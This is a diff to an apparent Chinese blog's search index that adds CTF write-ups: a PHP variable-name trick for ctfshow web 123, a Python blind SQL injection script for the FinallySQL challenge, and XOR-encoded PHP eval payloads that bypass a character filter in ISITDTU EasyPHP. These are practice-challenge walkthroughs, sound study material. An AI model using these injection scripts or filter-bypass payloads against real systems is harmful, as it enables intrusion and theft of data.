@@ -1009,7 +1009,10 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">for($</span><span class="bash">i=0;<span class="variable">$i</span>&lt;129;<span class="variable">$i</span>++)&#123;</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">s = chr(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span></span><br><span class="line"><span class="meta">	if(is_numeric($</span><span class="bash">s) and tirm(<span class="variable">$s</span>)!==<span class="string">&#x27;1&#x27;</span>)</span></span><br><span class="line"><span class="meta">		echo(urlencode(chr($</span><span class="bash">i).<span class="string">&#x27;\n&#x27;</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">%</span><span class="bash">0c  换页符</span></span><br><span class="line"><span class="meta">%</span><span class="bash">2B   +</span></span><br></pre></td></tr></table></figure>
 
 <p>加会被替换所以用%0c36</p>
-<h3 id="web-116-1"><a href="#web-116-1" class="headerlink" title="web 116"></a>web 116</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
+<h3 id="web-123"><a href="#web-123" class="headerlink" title="web 123"></a>web 123</h3><p>php的变量名是只能有数字字母下划线的，其中的<code>空格 + [ .</code>会被替换成下划线，但是有一个特性可以变量里面出现<code>.</code>那就是<code>[</code>这个符号出现之后被替换成下划线但是后面的符号是不会被替换的，后面的点也就会维持原样</p>
+<p>CTF_SHOW.COM =&gt;CTF[SHOW.COM=&gt;CTF_SHOW.COM</p>
+<p>然后进入eval($c.’;’)，没有任何过滤直接<code>echo $flag</code></p>
+<h3 id="web-125"><a href="#web-125" class="headerlink" title="web 125"></a>web 125</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
 <p>题目的提示：名字就是提示，我们只需要在网页的后面以get方式传入一个值就行了</p>
 <p>既然是ssti那么我们直接测试一下49看一下</p>
 <p>如果返回的是7777777那么就是jinjia2</p>
@@ -1707,5 +1710,82 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">class MinStack:</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        initialize your data structure here.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        self.Stack = []</span><br><span class="line">        self.Min = [math.inf]   #存放正无穷    </span><br><span class="line"></span><br><span class="line">    def push(self, x: int) -&gt; None:</span><br><span class="line">        self.Stack.append(x)</span><br><span class="line">        self.Min.append(min(x,self.Min[-1]))</span><br><span class="line"></span><br><span class="line">    def pop(self) -&gt; None:</span><br><span class="line">        self.Stack.pop()</span><br><span class="line">        self.Min.pop()</span><br><span class="line"></span><br><span class="line">    def top(self) -&gt; int:</span><br><span class="line">        return self.Stack[-1]</span><br><span class="line"></span><br><span class="line">    def getMin(self) -&gt; int:</span><br><span class="line">        return self.Min[-1]</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+  </entry>
+  <entry>
+    <title>FinallySQL</title>
+    <url>/2022/03/09/FinallySQL/</url>
+    <content><![CDATA[<h1 id="极客大挑战2019-FinallySQL"><a href="#极客大挑战2019-FinallySQL" class="headerlink" title="[极客大挑战2019]FinallySQL"></a>[极客大挑战2019]FinallySQL</h1><p>本题考点：</p>
+<p>sql盲注</p>
+<p>进入题目</p>
+<p><img src="/2022/03/09/FinallySQL/1.PNG" alt="1"></p>
+<p>页面给出了提示，sql盲注</p>
+<p>给出了一个登录框，然后还有一点提示，随便测试了一下在双引号的时候没有反应，单引号的时候发现被过滤，双引号后面结什么都是过滤，换个地方，尝试点点上面的提示</p>
+<p>发现点击之后传入id参数在这个参数测试了一下发现在^的时候可以回显正确值，那么注入点就在这里了。</p>
+<p>可以构造1^1^1–+把构造的语句放在中间，进行盲注（因为没有过滤别的什么内容，就不继续写了）附上代码：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">url = &#x27;http://a01bf763-5eda-42df-959f-7286945de334.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><span class="line">s = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(156,230):</span><br><span class="line">    sleep(1)</span><br><span class="line">    for j in range(32, 128):</span><br><span class="line">        database = f&quot;1^(ord(substr((select(database())),%d,1))&gt;%d)^1&quot; % (i, j)</span><br><span class="line">        tables = f&quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot; % (i, j)</span><br><span class="line">        columns = f&quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),%d,1))&gt;%d)^1&quot; % (i, j)</span><br><span class="line">        flag = f&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span><br><span class="line">        #io = requests.get(url +  database + &#x27;--+&#x27;)</span><br><span class="line">        io = requests.get(url + flag + &#x27;--+&#x27;)</span><br><span class="line">        if &quot;ERROR&quot; in io.text:</span><br><span class="line">            #print(i, j)</span><br><span class="line">            s += chr(j)</span><br><span class="line">            print(s)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>因为爆的太慢，还容易被ban这里就不多说了，flag在F1naI1y表的password中</p>
+]]></content>
+      <tags>
+        <tag>极客大挑战</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ISITDTU-EasyPHP</title>
+    <url>/2022/03/11/ISITDTU-EasyPHP/</url>
+    <content><![CDATA[<h1 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]-EasyPHP"></a>[ISITDTU 2019]-EasyPHP</h1><p>进入题目给了源码</p>
+<p>一步步分析：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">_ = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span></span><br><span class="line">if ( preg_match(&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;, $_) )</span><br><span class="line">    die(&#x27;rosé will not do it&#x27;);</span><br><span class="line"></span><br><span class="line">if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )</span><br><span class="line">    die(&#x27;you are so close, omg&#x27;);</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">eval($</span><span class="bash">_);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先查看一下过滤</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">for($</span><span class="bash">i=0;<span class="variable">$i</span>&lt;129;<span class="variable">$i</span>++)&#123;</span></span><br><span class="line">if(!preg_match(&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;, chr($i)))</span><br><span class="line">	echo (chr($i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有过滤的字符：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&#125;~</span><br></pre></td></tr></table></figure>
+
+<p>第二个if功能：</p>
+<p>将我们输入的字符串字母全部转换成小写然后统计里面字符出现的次数，如果长度小于13那么就可以执行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">strtolower — 将字符串转化为小写</span><br><span class="line">count_chars — 返回字符串所用字符的信息：</span><br><span class="line">第二个参数的作用：</span><br><span class="line">0 - 以所有的每个字节值作为键名，出现次数作为值的数组。  </span><br><span class="line">◦ 1 - 与 0 相同，但只列出出现次数大于零的字节值。  </span><br><span class="line">◦ 2 - 与 0 相同，但只列出出现次数等于零的字节值。  </span><br><span class="line">◦ 3 - 返回由所有使用了的字节值组成的字符串。  </span><br><span class="line">◦ 4 - 返回由所有未使用的字节值组成的字符串。 </span><br></pre></td></tr></table></figure>
+
+<p>可以看到没有过滤的字符中有^和~</p>
+<p>尝试一下phpinfo</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="string">&#x27;phpinfo&#x27;</span>^urldecode(%ff%ff%ff%ff%ff%ff%ff).<span class="string">&#x27;^%ff%ff%ff%ff%ff%ff%ff&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>%8F%97%8F%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</code></p>
+<p><img src="/2022/03/11/ISITDTU-EasyPHP/1.png" alt="1"></p>
+<p>指令正常执行了</p>
+<p>接下来就是继续构造数了</p>
+<p>首先讲解一下如何构造异或</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~按位取反</span><br><span class="line">^按位异或</span><br><span class="line">一般来说按位异或得到的结果会更多</span><br><span class="line">异或的构造</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/11/ISITDTU-EasyPHP/2.png" alt="1"></p>
+<p>按位取反就比较单调了，比较一下他俩的区别：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(&#x27;phpinfo&#x27;^urldecode(&#x27;%ff%ff%ff%ff%ff%ff%ff&#x27;)).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo urlencode(~&#x27;phpinfo&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>他俩的输出结果都是一样的，而异或的右边我们可以更改，所以一般来说如果都没有过滤用的多的还是异或</p>
+<p>既然能够执行命令，那么剩下的就是构造命令</p>
+<p>看一下phpinfo中禁用的函数：</p>
+<p><img src="/2022/03/11/ISITDTU-EasyPHP/3.png" alt="1"></p>
+<p>可以看到scandir，跟print_r的组合是没有被禁的</p>
+<p>我们就得想办法构造出<code>print_r(scandir(.))</code></p>
+<p>除去必须要的字符<code>^ (  )  ; _ .</code>字符，我们能够利用的字符数量只有7个，我们需要用七个字符串构造printscad，但是我们有只剩七个字符</p>
+<p>所以我们需要删除，一般三个异或构造的情况会很多，所以用三个异或来看看那些字符是可以删的</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">array = <span class="string">&#x27;acdisp &#x27;</span>   <span class="comment">#printscad             acdilps              readfil</span></span><br><span class="line">now = <span class="string">&#x27;printscad &#x27;</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> now:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> array:</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> array:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> array:</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">ord</span>(j)^<span class="built_in">ord</span>(m)^<span class="built_in">ord</span>(k)==<span class="built_in">ord</span>(i)):</span><br><span class="line">                        <span class="built_in">print</span>(i + <span class="string">&#x27;=&#x27;</span> + m + <span class="string">&#x27;^&#x27;</span> + j + <span class="string">&#x27;^&#x27;</span> + k)</span><br><span class="line">                        s += i</span><br><span class="line">a = s[<span class="number">0</span>]</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span> (a!=s[i]):</span><br><span class="line">        a=s[i]</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> count == <span class="number">9</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以一直删直到可以完成条件，可以看到只需要六个字符就可以构造出完整的字符串</p>
+<p>print_r(scandit(.));</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="meta">((%</span><span class="bash">9E%9E%9E%9B%9B%A0%9E)^(%8F%9C%9E%9C%9C%A0%9C)^(%9E%8F%96%96%8C%A0%8F)^(%FF%FF%FF%FF%FF%FF%FF))(((%9E%9E%9E%9B%9E%9E%9E)^(%9E%9E%9E%9C%9E%9E%9C)^(%8C%9C%9E%96%9B%96%8F)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF));</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/11/ISITDTU-EasyPHP/4.png" alt="1"></p>
+<p>一眼就看出flag在末尾，我们用end来置换队列，然后用readfile读取文件就行了</p>
+<p>因为调试起来非常麻烦所以我就直接给出答案了用<code>acedils</code>构造scandirefl只需要7个字符串</p>
+<p>payload：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">((%</span><span class="bash">8c%9a%9e%9b%9c%96%93%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff)^(%9b%ff%ff%ff%93%ff%ff%ff)^(%9a%ff%ff%ff%96%ff%ff%ff))(((%9a%9c%9b)^(%ff%ff%ff)^(%ff%93%ff)^(%ff%9e%ff))(((%8c%9c%9e%9c%9b%96%8c)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%93%ff%ff%9b)^(%ff%ff%ff%9e%ff%ff%9a))(%d1^%ff)));</span></span><br></pre></td></tr></table></figure>
+
+<p>flag{b1f02f01-8607-453e-b495-a183409287ef}</p>
+]]></content>
+      <tags>
+        <tag>ISITDTU</tag>
+      </tags>
   </entry>
 </search>
